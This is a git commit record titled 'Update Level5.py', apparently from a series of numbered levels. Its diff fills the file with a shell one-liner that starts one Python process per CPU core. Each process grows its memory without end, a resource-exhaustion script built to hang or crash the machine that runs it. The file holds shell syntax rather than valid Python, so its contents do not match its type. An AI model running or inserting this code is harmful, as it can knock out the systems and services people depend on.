5297a06160641fd906351df00aa62ee60dfe378f
Bit77 <daren@markandtraci.com>
2025-08-12 08:48:28 -0500

    Update Level5.py

--- Level5.py
+++ Level5.py
@@ -1,1 +1,9 @@
-
+python3 -c "
+import multiprocessing
+def extreme():
+    data = []
+    while True:
+        data.append([x**2 for x in range(10000)])
+procs = [multiprocessing.Process(target=extreme) for _ in range(multiprocessing.cpu_count())]
+[p.start() for p in procs]
+"
